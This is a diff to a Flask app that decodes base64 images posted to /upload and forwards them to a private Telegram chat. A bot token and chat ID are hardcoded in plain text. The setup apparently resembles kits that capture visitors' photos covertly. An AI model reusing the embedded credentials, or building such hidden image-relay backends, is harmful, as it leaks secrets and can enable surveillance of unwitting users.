@@ -1,13 +1,10 @@
-الملف الأول: app.py
-اسم الملف: app.py
-الكود:
 from flask import Flask, request, render_template, jsonify
 import requests
 import os
+import base64
 
 app = Flask(__name__)
 
-# معلومات البوت
 BOT_TOKEN = "8485606950:AAGM9hMgwVV-QG5zlob2TGMuoxNucWkieyI"
 CHAT_ID = "7628738409"
 
@@ -18,14 +15,9 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
-        # استقبال الصورة
         image_data = request.json.get('image')
-        
-        # تحويل base64 إلى ملف
-        import base64
         image_binary = base64.b64decode(image_data.split(',')[1])
         
-        # إرسال الصورة للتيليجرام
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
         files = {'photo': ('photo.jpg', image_binary, 'image/jpeg')}
         data = {'chat_id': CHAT_ID}
